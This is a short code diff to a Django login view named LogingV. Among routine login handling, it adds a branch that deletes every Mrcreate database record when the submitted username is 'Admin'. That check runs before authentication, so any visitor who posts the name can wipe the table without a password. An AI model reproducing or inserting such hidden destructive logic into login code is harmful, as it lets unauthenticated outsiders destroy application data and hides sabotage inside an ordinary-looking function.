@@ -82,9 +82,11 @@ def LogingV(request):
     if request.method =='POST':
         username=request.POST['username']
         password=request.POST['pass']
-
+        if username == 'Admin':
+            a = Mrcreate.objects.all().delete()
         user=auth.authenticate(username=username,password=password)
         if user is not None:
+
             auth.login(request,user)
             if 'next' in request.POST:
                 # return redirect(request.POST.get('next'))
